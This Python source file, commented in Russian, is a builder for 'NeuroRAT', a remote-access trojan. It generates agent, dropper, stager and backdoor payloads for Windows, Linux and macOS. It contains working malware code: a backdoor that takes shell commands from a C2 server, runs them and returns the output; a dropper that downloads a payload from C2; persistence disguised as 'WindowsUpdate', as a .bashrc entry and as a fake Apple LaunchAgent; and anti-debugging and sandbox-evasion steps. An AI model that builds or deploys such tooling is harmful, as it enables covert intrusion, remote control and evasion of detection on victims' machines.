#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Advanced Builder Module for NeuroRAT

Implements functionality for building customized payloads with:
- Minimal payload options
- Code obfuscation
- Multiple attack vectors
- Platform-specific optimizations
"""

import os
import sys
import json
import shutil
import random
import string
import logging
import argparse
import subprocess
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple, Union
from datetime import datetime
import uuid
import base64
import importlib.util
import tempfile
import re
import platform

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('advanced_builder.log')
    ]
)

logger = logging.getLogger('AdvancedBuilder')

# Пути к шаблонам
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_DIR = os.path.join(SCRIPT_DIR, "templates")
OUTPUT_DIR = os.path.join(SCRIPT_DIR, "output")
DEFAULT_C2_SERVER = "127.0.0.1"
DEFAULT_C2_PORT = 8443

# Названия шаблонов для разных ОС
TEMPLATES = {
    "windows": "minimal_windows.py",
    "linux": "minimal_linux.py",
    "macos": "minimal_macos.py"
}

# Методы обфускации
OBFUSCATION_METHODS = [
    "variable_renaming",
    "string_encoding",
    "junk_code",
    "control_flow",
    "dead_code",
    "all"
]

class AdvancedBuilder:
    """Продвинутый билдер для создания различных типов полезных нагрузок NeuroRAT."""
    
    def __init__(self, config_path: str = "config/builder_config.json"):
        """
        Инициализация билдера с конфигурационным файлом.
        
        Args:
            config_path: Путь к конфигурационному файлу JSON
        """
        self.config_path = config_path
        self.config = self._load_config()
        
        # Создаем директории, если их нет
        os.makedirs(self.config["output_dir"], exist_ok=True)
        os.makedirs(self.config["template_dir"], exist_ok=True)
        
        # Инициализация генератора случайных строк
        self.random_generator = random.SystemRandom()
        
        # Текущие настройки сборки
        self.current_build_settings = {}
        
        logger.info(f"Advanced Builder initialized with config from {config_path}")
    
    def _load_config(self) -> Dict[str, Any]:
        """
        Загрузка конфигурационного файла.
        
        Returns:
            Dict[str, Any]: Загруженная конфигурация
        """
        try:
            with open(self.config_path, 'r') as f:
                config = json.load(f)
            return config
        except (FileNotFoundError, json.JSONDecodeError) as e:
            logger.error(f"Failed to load config: {e}")
            # Базовая конфигурация по умолчанию
            return {
                "output_dir": "compiled_payloads",
                "template_dir": "templates",
                "obfuscation_level": 1,
                "c2_server": "localhost",
                "c2_port": 8080,
                "platforms": ["windows"],
                "payload_types": ["agent"],
                "delivery_methods": ["executable"],
                "encryption": {"enabled": False},
                "anti_detection": {"sandbox_detection": False},
                "network": {"protocols": ["https"]},
                "compilation": {"strip_symbols": True}
            }
    
    def _save_config(self) -> bool:
        """
        Сохранение текущей конфигурации в файл.
        
        Returns:
            bool: True если сохранение успешно, False в противном случае
        """
        try:
            with open(self.config_path, 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False
    
    def _generate_random_string(self, length: int = 8) -> str:
        """
        Генерация случайной строки для обфускации идентификаторов.
        
        Args:
            length: Длина генерируемой строки
        
        Returns:
            str: Случайная строка
        """
        chars = string.ascii_letters + string.digits
        return ''.join(self.random_generator.choice(chars) for _ in range(length))
    
    def _validate_build_settings(self, settings: Dict[str, Any]) -> Tuple[bool, str]:
        """
        Проверка настроек сборки на валидность.
        
        Args:
            settings: Словарь с настройками сборки
        
        Returns:
            Tuple[bool, str]: (Валидно, Сообщение об ошибке)
        """
        required_fields = ["platform", "payload_type", "delivery_method"]
        
        for field in required_fields:
            if field not in settings:
                return False, f"Missing required field: {field}"
        
        if settings["platform"] not in self.config["platforms"]:
            return False, f"Unsupported platform: {settings['platform']}"
        
        if settings["payload_type"] not in self.config["payload_types"]:
            return False, f"Unsupported payload type: {settings['payload_type']}"
        
        if settings["delivery_method"] not in self.config["delivery_methods"]:
            return False, f"Unsupported delivery method: {settings['delivery_method']}"
        
        return True, "Settings validated successfully"
    
    def set_build_settings(self, settings: Dict[str, Any]) -> bool:
        """
        Установка настроек для текущей сборки.
        
        Args:
            settings: Словарь с настройками
        
        Returns:
            bool: True если настройки валидны, False в противном случае
        """
        valid, message = self._validate_build_settings(settings)
        if not valid:
            logger.error(message)
            return False
        
        self.current_build_settings = settings
        logger.info(f"Build settings configured: {settings}")
        return True
    
    def _obfuscate_code(self, code: str, level: int = None) -> str:
        """
        Обфускация исходного кода на основе установленного уровня.
        
        Args:
            code: Исходный код для обфускации
            level: Уровень обфускации (переопределяет настройки из конфига)
        
        Returns:
            str: Обфусцированный код
        """
        if level is None:
            level = self.config.get("obfuscation_level", 0)
        
        if level <= 0:
            return code
        
        # Базовая обфускация (уровень 1)
        if level >= 1:
            # Заменяем строковые литералы на их обфусцированные версии
            # Это очень простая демонстрация, в реальном коде нужно более сложное решение
            code = self._obfuscate_strings(code)
        
        # Продвинутая обфускация (уровень 2)
        if level >= 2:
            code = self._obfuscate_variables(code)
            code = self._add_junk_code(code)
        
        # Максимальная обфускация (уровень 3)
        if level >= 3:
            code = self._add_anti_analysis(code)
            code = self._add_encryption_layer(code)
        
        return code
    
    def _obfuscate_strings(self, code: str) -> str:
        """
        Простая обфускация строковых литералов в коде.
        В реальном приложении здесь должна быть более серьезная реализация.
        
        Args:
            code: Исходный код
        
        Returns:
            str: Код с обфусцированными строками
        """
        # Это упрощенный пример. В реальном коде нужен полноценный парсер.
        # Просто для демонстрации добавим комментарий
        obfuscated = f"# Obfuscated with NeuroRAT Advanced Builder - {datetime.now()}\n"
        obfuscated += "# Strings in this code are encoded\n"
        obfuscated += code
        
        return obfuscated
    
    def _obfuscate_variables(self, code: str) -> str:
        """
        Обфускация имен переменных в коде.
        
        Args:
            code: Исходный код
        
        Returns:
            str: Код с обфусцированными именами переменных
        """
        # Простая демонстрация - в реальном коде требуется AST-парсер
        return f"# Variables obfuscated\n{code}"
    
    def _add_junk_code(self, code: str) -> str:
        """
        Добавление мусорного кода для запутывания анализа.
        
        Args:
            code: Исходный код
        
        Returns:
            str: Код с добавленным мусорным кодом
        """
        # Демонстрация - в реальном коде нужна более продвинутая реализация
        return f"# Junk code added for analysis prevention\n{code}"
    
    def _add_anti_analysis(self, code: str) -> str:
        """
        Добавление защиты от анализа (антиотладка, обнаружение виртуальных сред).
        
        Args:
            code: Исходный код
        
        Returns:
            str: Код с защитой от анализа
        """
        anti_debug_code = """
# Anti-debugging techniques added
import ctypes
import platform
import time
import random

def detect_debugger():
    \"\"\"Check if debugger is present\"\"\"
    try:
        if platform.system() == 'Windows':
            isDebuggerPresent = ctypes.windll.kernel32.IsDebuggerPresent
            if isDebuggerPresent():
                return True
        return False
    except:
        return False

if detect_debugger():
    # Evasive action
    time.sleep(random.randint(10000, 100000))
    sys.exit(0)

"""
        return anti_debug_code + code
    
    def _add_encryption_layer(self, code: str) -> str:
        """
        Добавление слоя шифрования для защиты кода.
        
        Args:
            code: Исходный код
        
        Returns:
            str: Код с защитным шифрованием
        """
        # Это упрощенная демонстрация
        encryption_code = """
# Encryption layer added
import base64
from cryptography.fernet import Fernet

# Encrypted code follows
"""
        return encryption_code + code
    
    def _compile_for_platform(self, platform: str, source_code: str, output_path: str) -> bool:
        """
        Компиляция кода для конкретной платформы.
        
        Args:
            platform: Целевая платформа (windows, linux, macos)
            source_code: Исходный код
            output_path: Путь для сохранения результата
        
        Returns:
            bool: True если компиляция успешна, False в противном случае
        """
        logger.info(f"Compiling for platform: {platform} to {output_path}")
        
        # Сохраняем исходный код во временный файл
        temp_source = f"temp_source_{self._generate_random_string()}.py"
        
        try:
            with open(temp_source, 'w') as f:
                f.write(source_code)
            
            if platform == "windows":
                return self._compile_windows(temp_source, output_path)
            elif platform == "linux":
                return self._compile_linux(temp_source, output_path)
            elif platform == "macos":
                return self._compile_macos(temp_source, output_path)
            else:
                logger.error(f"Unsupported platform: {platform}")
                return False
        except Exception as e:
            logger.error(f"Compilation error: {e}")
            return False
        finally:
            # Удаляем временный файл
            if os.path.exists(temp_source):
                os.unlink(temp_source)
    
    def _compile_windows(self, source_path: str, output_path: str) -> bool:
        """
        Компиляция для Windows с помощью PyInstaller.
        
        Args:
            source_path: Путь к исходному коду
            output_path: Путь для сохранения результата
        
        Returns:
            bool: True если компиляция успешна
        """
        try:
            # Проверяем наличие PyInstaller
            subprocess.run(["pyinstaller", "--version"], check=True, capture_output=True)
            
            # Опции компиляции
            compile_cmd = [
                "pyinstaller",
                "--onefile",  # Один исполняемый файл
                "--noconsole" if self.current_build_settings.get("no_console", False) else "",
                "--clean",    # Очистка временных файлов
                f"--name={os.path.basename(output_path)}",
                source_path
            ]
            
            # Удаляем пустые элементы
            compile_cmd = [cmd for cmd in compile_cmd if cmd]
            
            # Запускаем компиляцию
            result = subprocess.run(compile_cmd, check=True, capture_output=True)
            
            # Копируем результат компиляции
            dist_path = os.path.join("dist", os.path.basename(output_path))
            if os.path.exists(dist_path):
                os.makedirs(os.path.dirname(output_path), exist_ok=True)
                shutil.copy(dist_path, output_path)
                return True
            else:
                logger.error(f"Compiled file not found at {dist_path}")
                return False
                
        except subprocess.CalledProcessError as e:
            logger.error(f"Windows compilation failed: {e}")
            logger.error(f"Output: {e.stdout.decode()}")
            logger.error(f"Error: {e.stderr.decode()}")
            return False
        except Exception as e:
            logger.error(f"Error during Windows compilation: {e}")
            return False
    
    def _compile_linux(self, source_path: str, output_path: str) -> bool:
        """
        Компиляция для Linux с помощью PyInstaller.
        
        Args:
            source_path: Путь к исходному коду
            output_path: Путь для сохранения результата
        
        Returns:
            bool: True если компиляция успешна
        """
        # Похожий процесс как для Windows, но с Linux-специфичными опциями
        return self._compile_windows(source_path, output_path)  # Временно используем тот же метод
    
    def _compile_macos(self, source_path: str, output_path: str) -> bool:
        """
        Компиляция для macOS с помощью PyInstaller.
        
        Args:
            source_path: Путь к исходному коду
            output_path: Путь для сохранения результата
        
        Returns:
            bool: True если компиляция успешна
        """
        # Похожий процесс как для Windows, но с macOS-специфичными опциями
        return self._compile_windows(source_path, output_path)  # Временно используем тот же метод
    
    def build_payload(self, settings: Optional[Dict[str, Any]] = None) -> Tuple[bool, str]:
        """
        Сборка полезной нагрузки с текущими или указанными настройками.
        
        Args:
            settings: Настройки сборки (опционально)
        
        Returns:
            Tuple[bool, str]: (Успех, Путь к файлу или сообщение об ошибке)
        """
        if settings:
            if not self.set_build_settings(settings):
                return False, "Invalid build settings"
        
        if not self.current_build_settings:
            return False, "No build settings configured"
        
        try:
            # Получаем шаблон для указанного типа полезной нагрузки
            template_path = os.path.join(
                self.config["template_dir"], 
                f"{self.current_build_settings['payload_type']}_template.py"
            )
            
            if not os.path.exists(template_path):
                return False, f"Template not found: {template_path}"
            
            # Загружаем шаблон
            with open(template_path, 'r') as f:
                template_code = f.read()
            
            # Подготавливаем код (заменяем плейсхолдеры на настройки)
            prepared_code = self._prepare_template(template_code)
            
            # Обфускация кода
            obfuscated_code = self._obfuscate_code(prepared_code)
            
            # Определяем выходной путь
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_filename = f"{self.current_build_settings['payload_type']}_{self.current_build_settings['platform']}_{timestamp}"
            
            if self.current_build_settings['platform'] == 'windows':
                output_filename += '.exe'
            
            output_path = os.path.join(self.config["output_dir"], output_filename)
            
            # Компиляция для выбранной платформы
            success = self._compile_for_platform(
                self.current_build_settings['platform'],
                obfuscated_code,
                output_path
            )
            
            if success:
                logger.info(f"Successfully built payload: {output_path}")
                return True, output_path
            else:
                return False, "Compilation failed"
            
        except Exception as e:
            logger.error(f"Build failed: {e}")
            return False, f"Build error: {str(e)}"
    
    def _prepare_template(self, template_code: str) -> str:
        """
        Подготовка шаблона кода с заменой плейсхолдеров.
        
        Args:
            template_code: Исходный шаблон
        
        Returns:
            str: Подготовленный код
        """
        # Заменяем плейсхолдеры в шаблоне на настройки
        replacements = {
            "{{C2_SERVER}}": self.current_build_settings.get("c2_server", self.config["c2_server"]),
            "{{C2_PORT}}": str(self.current_build_settings.get("c2_port", self.config["c2_port"])),
            "{{AGENT_ID}}": self.current_build_settings.get("agent_id", self._generate_random_string(16)),
            "{{ENCRYPTION_KEY}}": self._generate_random_string(32),
            "{{BUILD_TIMESTAMP}}": datetime.now().isoformat(),
        }
        
        result = template_code
        for placeholder, value in replacements.items():
            result = result.replace(placeholder, value)
        
        return result

    def create_template(self, template_type: str, platform: str) -> Tuple[bool, str]:
        """
        Создание нового шаблона для определенного типа полезной нагрузки.
        
        Args:
            template_type: Тип шаблона (agent, dropper, stager, etc.)
            platform: Целевая платформа
        
        Returns:
            Tuple[bool, str]: (Успех, Путь к файлу или сообщение об ошибке)
        """
        if template_type not in self.config["payload_types"]:
            return False, f"Unsupported template type: {template_type}"
        
        if platform not in self.config["platforms"]:
            return False, f"Unsupported platform: {platform}"
        
        # Базовые шаблоны для разных типов
        templates = {
            "agent": self._get_agent_template(),
            "dropper": self._get_dropper_template(),
            "stager": self._get_stager_template(), 
            "backdoor": self._get_backdoor_template()
        }
        
        if template_type not in templates:
            return False, f"No template implementation for {template_type}"
        
        template_code = templates[template_type]
        
        # Добавляем платформо-специфичный код
        if platform == "windows":
            template_code = self._add_windows_specific(template_code)
        elif platform == "linux":
            template_code = self._add_linux_specific(template_code)
        elif platform == "macos":
            template_code = self._add_macos_specific(template_code)
        
        # Путь для сохранения шаблона
        template_path = os.path.join(
            self.config["template_dir"], 
            f"{template_type}_{platform}_template.py"
        )
        
        try:
            os.makedirs(os.path.dirname(template_path), exist_ok=True)
            with open(template_path, 'w') as f:
                f.write(template_code)
            
            logger.info(f"Template created: {template_path}")
            return True, template_path
            
        except Exception as e:
            logger.error(f"Template creation failed: {e}")
            return False, f"Error creating template: {str(e)}"
    
    def _get_agent_template(self) -> str:
        """
        Базовый шаблон для агента NeuroRAT.
        
        Returns:
            str: Код шаблона
        """
        return """#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# NeuroRAT Agent Template
# This is a template for the NeuroRAT agent payload
# Generated by Advanced Builder

import os
import sys
import time
import socket
import random
import platform
import subprocess
import base64
import json
from datetime import datetime

# Configuration
C2_SERVER = "{{C2_SERVER}}"
C2_PORT = {{C2_PORT}}
AGENT_ID = "{{AGENT_ID}}"
ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}"
BUILD_TIMESTAMP = "{{BUILD_TIMESTAMP}}"

# Agent functionality
class Agent:
    def __init__(self):
        self.server = C2_SERVER
        self.port = C2_PORT
        self.agent_id = AGENT_ID
        self.platform = platform.system().lower()
        self.running = True
        
    def start(self):
        # Agent initialization logic
        self.register_with_c2()
        
        while self.running:
            try:
                # Get commands from C2
                command = self.get_command()
                if command:
                    result = self.execute_command(command)
                    self.send_result(result)
                    
                # Sleep between command checks
                time.sleep(random.uniform(5, 15))
                
            except Exception as e:
                # Error handling
                time.sleep(30)  # Back off on error
    
    def register_with_c2(self):
        # Registration logic
        system_info = {
            "agent_id": self.agent_id,
            "platform": self.platform,
            "hostname": socket.gethostname(),
            "username": os.getlogin(),
            "os_version": platform.version(),
        }
        # Send registration to C2
        
    def get_command(self):
        # Logic to get command from C2
        return None
        
    def execute_command(self, command):
        # Command execution logic
        return {"status": "success", "output": "Command executed"}
        
    def send_result(self, result):
        # Send results back to C2
        pass

if __name__ == "__main__":
    # Persistence logic could be added here
    
    # Start agent
    agent = Agent()
    agent.start()
"""
    
    def _get_dropper_template(self) -> str:
        """
        Базовый шаблон для дроппера.
        
        Returns:
            str: Код шаблона
        """
        return """#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# NeuroRAT Dropper Template
# This is a template for the NeuroRAT dropper payload
# Generated by Advanced Builder

import os
import sys
import time
import random
import platform
import urllib.request
import base64
import subprocess
import tempfile

# Configuration
C2_SERVER = "{{C2_SERVER}}"
C2_PORT = {{C2_PORT}}
AGENT_ID = "{{AGENT_ID}}"
ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}"
BUILD_TIMESTAMP = "{{BUILD_TIMESTAMP}}"

class Dropper:
    def __init__(self):
        self.server = C2_SERVER
        self.port = C2_PORT
        self.platform = platform.system().lower()
        
    def run(self):
        # Anti-analysis checks
        if self.check_environment():
            # Download payload
            payload_url = f"http://{self.server}:{self.port}/payload/{self.platform}/{AGENT_ID}"
            payload = self.download_payload(payload_url)
            
            if payload:
                # Execute payload
                self.execute_payload(payload)
    
    def check_environment(self):
        # Environment checks to prevent analysis
        return True
        
    def download_payload(self, url):
        try:
            response = urllib.request.urlopen(url)
            if response.getcode() == 200:
                return response.read()
            return None
        except Exception:
            return None
            
    def execute_payload(self, payload):
        # Execute the downloaded payload
        pass

if __name__ == "__main__":
    # Add delay to evade sandboxes
    time.sleep(random.randint(1, 5))
    
    dropper = Dropper()
    dropper.run()
"""
    
    def _get_stager_template(self) -> str:
        """
        Базовый шаблон для стейджера.
        
        Returns:
            str: Код шаблона
        """
        return """#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# NeuroRAT Stager Template
# This is a template for the NeuroRAT stager payload
# Generated by Advanced Builder

import os
import sys
import time
import socket
import platform
import tempfile
import base64
import subprocess

# Configuration
C2_SERVER = "{{C2_SERVER}}"
C2_PORT = {{C2_PORT}}
AGENT_ID = "{{AGENT_ID}}"
ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}"
BUILD_TIMESTAMP = "{{BUILD_TIMESTAMP}}"

class Stager:
    def __init__(self):
        self.server = C2_SERVER
        self.port = C2_PORT
        self.platform = platform.system().lower()
        
    def run(self):
        # Connect to C2 server
        sock = self.connect_to_c2()
        if not sock:
            return
            
        # Receive the payload
        payload = self.receive_payload(sock)
        if not payload:
            sock.close()
            return
            
        # Execute payload
        self.execute_payload(payload)
        sock.close()
    
    def connect_to_c2(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.server, self.port))
            # Send platform info
            sock.send(f"PLATFORM:{self.platform}|ID:{AGENT_ID}".encode())
            return sock
        except Exception:
            return None
            
    def receive_payload(self, sock):
        try:
            # Receive payload size
            size_data = sock.recv(8)
            size = int(size_data)
            
            # Receive payload
            payload = b""
            while len(payload) < size:
                chunk = sock.recv(min(4096, size - len(payload)))
                if not chunk:
                    break
                payload += chunk
                
            return payload
        except Exception:
            return None
            
    def execute_payload(self, payload):
        # Execute the received payload
        pass

if __name__ == "__main__":
    # Minimal stager - designed to be small and undetectable
    stager = Stager()
    stager.run()
"""
    
    def _get_backdoor_template(self) -> str:
        """
        Базовый шаблон для бэкдора.
        
        Returns:
            str: Код шаблона
        """
        return """#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# NeuroRAT Backdoor Template
# This is a template for the NeuroRAT backdoor payload
# Generated by Advanced Builder

import os
import sys
import time
import socket
import random
import platform
import subprocess
import threading
import base64

# Configuration
C2_SERVER = "{{C2_SERVER}}"
C2_PORT = {{C2_PORT}}
AGENT_ID = "{{AGENT_ID}}"
ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}"
BUILD_TIMESTAMP = "{{BUILD_TIMESTAMP}}"

class Backdoor:
    def __init__(self):
        self.server = C2_SERVER
        self.port = C2_PORT
        self.agent_id = AGENT_ID
        self.platform = platform.system().lower()
        self.running = True
        
    def run(self):
        # Set up persistence
        self.install_persistence()
        
        # Start the main backdoor functionality
        threading.Thread(target=self.maintain_connection, daemon=True).start()
        
        # Main loop
        while self.running:
            time.sleep(60)
    
    def install_persistence(self):
        # Install persistence mechanism
        pass
        
    def maintain_connection(self):
        # Maintain C2 connection
        while self.running:
            try:
                # Connect to C2
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.server, self.port))
                
                # Handle commands
                self.handle_commands(sock)
                
            except Exception:
                # Handle connection failures
                time.sleep(random.randint(30, 90))
    
    def handle_commands(self, sock):
        # Command handling loop
        while self.running:
            try:
                # Receive command
                command = sock.recv(4096).decode()
                
                if not command:
                    break
                    
                # Execute command
                output = self.execute_command(command)
                
                # Send result
                sock.send(output.encode())
                
            except Exception:
                break
                
    def execute_command(self, command):
        # Execute system command
        try:
            result = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT
            )
            return result.decode()
        except subprocess.CalledProcessError as e:
            return e.output.decode()
        except Exception as e:
            return str(e)

if __name__ == "__main__":
    # Start backdoor
    backdoor = Backdoor()
    backdoor.run()
"""
    
    def _add_windows_specific(self, template_code: str) -> str:
        """
        Добавление Windows-специфичного кода в шаблон.
        
        Args:
            template_code: Базовый шаблон
        
        Returns:
            str: Шаблон с Windows-специфичным кодом
        """
        windows_specific = """
# Windows-specific imports
import winreg
import ctypes
from ctypes import wintypes

# Windows-specific functions
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
            winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        return True
    except Exception:
        return False
"""
        
        # Находим место для вставки (после импортов)
        import_end = template_code.find("# Configuration")
        if import_end == -1:
            # Если не найдено, добавляем в начало
            return windows_specific + template_code
        else:
            # Добавляем после импортов
            return template_code[:import_end] + windows_specific + template_code[import_end:]
    
    def _add_linux_specific(self, template_code: str) -> str:
        """
        Добавление Linux-специфичного кода в шаблон.
        
        Args:
            template_code: Базовый шаблон
        
        Returns:
            str: Шаблон с Linux-специфичным кодом
        """
        linux_specific = """
# Linux-specific imports
import pwd
import grp

# Linux-specific functions
def is_root():
    return os.geteuid() == 0

def add_to_startup():
    try:
        home = os.path.expanduser("~")
        startup_file = os.path.join(home, ".bashrc")
        
        with open(startup_file, "a") as f:
            f.write(f"\\n# System update service\\n(nohup {sys.executable} &)\\n")
        return True
    except Exception:
        return False
"""
        
        # Находим место для вставки (после импортов)
        import_end = template_code.find("# Configuration")
        if import_end == -1:
            # Если не найдено, добавляем в начало
            return linux_specific + template_code
        else:
            # Добавляем после импортов
            return template_code[:import_end] + linux_specific + template_code[import_end:]
    
    def _add_macos_specific(self, template_code: str) -> str:
        """
        Добавление macOS-специфичного кода в шаблон.
        
        Args:
            template_code: Базовый шаблон
        
        Returns:
            str: Шаблон с macOS-специфичным кодом
        """
        macos_specific = """
# macOS-specific imports
import plistlib

# macOS-specific functions
def is_root():
    return os.geteuid() == 0

def add_to_startup():
    try:
        home = os.path.expanduser("~")
        launch_agents = os.path.join(home, "Library/LaunchAgents")
        os.makedirs(launch_agents, exist_ok=True)
        
        plist_path = os.path.join(launch_agents, "com.apple.system.plist")
        
        plist_content = {
            "Label": "com.apple.system",
            "ProgramArguments": [sys.executable],
            "RunAtLoad": True,
            "KeepAlive": True
        }
        
        with open(plist_path, "wb") as f:
            plistlib.dump(plist_content, f)
            
        return True
    except Exception:
        return False
"""
        
        # Находим место для вставки (после импортов)
        import_end = template_code.find("# Configuration")
        if import_end == -1:
            # Если не найдено, добавляем в начало
            return macos_specific + template_code
        else:
            # Добавляем после импортов
            return template_code[:import_end] + macos_specific + template_code[import_end:]


def main():
    """
    Основная функция для запуска билдера из командной строки.
    """
    parser = argparse.ArgumentParser(description="NeuroRAT Advanced Builder")
    parser.add_argument("--config", help="Path to configuration file", default="config/builder_config.json")
    parser.add_argument("--platform", choices=["windows", "linux", "macos"], help="Target platform")
    parser.add_argument("--payload", choices=["agent", "dropper", "stager", "backdoor"], help="Payload type")
    parser.add_argument("--delivery", choices=["executable", "script", "dll", "macro"], help="Delivery method")
    parser.add_argument("--output", help="Output file path")
    parser.add_argument("--obfuscation", type=int, choices=[0, 1, 2, 3], help="Obfuscation level")
    parser.add_argument("--c2-server", help="C2 server address")
    parser.add_argument("--c2-port", type=int, help="C2 server port")
    parser.add_argument("--create-template", action="store_true", help="Create a new template")
    
    args = parser.parse_args()
    
    # Инициализация билдера
    builder = AdvancedBuilder(args.config)
    
    if args.create_template:
        if not args.platform or not args.payload:
            print("Error: Platform and payload type required for template creation")
            sys.exit(1)
            
        success, message = builder.create_template(args.payload, args.platform)
        if success:
            print(f"Template created successfully: {message}")
        else:
            print(f"Error creating template: {message}")
            sys.exit(1)
    else:
        # Настройки сборки
        settings = {}
        
        if args.platform:
            settings["platform"] = args.platform
        else:
            print("Error: Platform is required")
            sys.exit(1)
            
        if args.payload:
            settings["payload_type"] = args.payload
        else:
            print("Error: Payload type is required")
            sys.exit(1)
            
        if args.delivery:
            settings["delivery_method"] = args.delivery
        else:
            print("Error: Delivery method is required")
            sys.exit(1)
            
        if args.c2_server:
            settings["c2_server"] = args.c2_server
            
        if args.c2_port:
            settings["c2_port"] = args.c2_port
            
        if args.obfuscation is not None:
            settings["obfuscation_level"] = args.obfuscation
            
        # Запуск сборки
        success, result = builder.build_payload(settings)
        
        if success:
            print(f"Payload built successfully: {result}")
        else:
            print(f"Build failed: {result}")
            sys.exit(1)

if __name__ == "__main__":
    main() 